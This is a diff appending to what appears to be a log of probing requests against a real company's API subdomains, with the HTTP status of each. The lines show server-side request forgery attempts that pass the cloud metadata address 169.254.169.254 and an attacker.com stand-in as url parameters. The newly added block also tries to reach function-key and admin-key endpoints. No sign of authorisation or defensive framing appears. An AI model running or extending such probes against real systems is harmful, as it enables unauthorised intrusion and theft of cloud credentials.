@@ -17,3 +17,13 @@ https://dev-clientcert-sap.api.basf.com/ -> HTTP 400
 https://ap-eupf.api.basf.com/api/health?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01 -> HTTP 403
 https://ap-digitalconnect.api.basf.com/api/health?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01 -> HTTP 403
 https://dev-ext001.api.basf.com/ -> HTTP 400
+
+## 2026-09-03 21:00:34 UTC
+https://ap-digitalconnect.api.basf.com/.azurefunctions/keys -> HTTP 404
+https://ap-digitalconnect.api.basf.com/admin/v2/keys -> HTTP 404
+https://ap-eupf.api.basf.com/api/<enum>?url=http://attacker.com -> HTTP 403
+https://ap-eupf.api.basf.com/ -> 200 len=150093
+https://dev-clientcert-sap.api.basf.com/ -> HTTP 400
+https://ap-eupf.api.basf.com/api/health -> HTTP 404
+https://ap-digitalconnect.api.basf.com/admin/list -> HTTP 404
+https://dev-ext001.api.basf.com/ -> HTTP 400
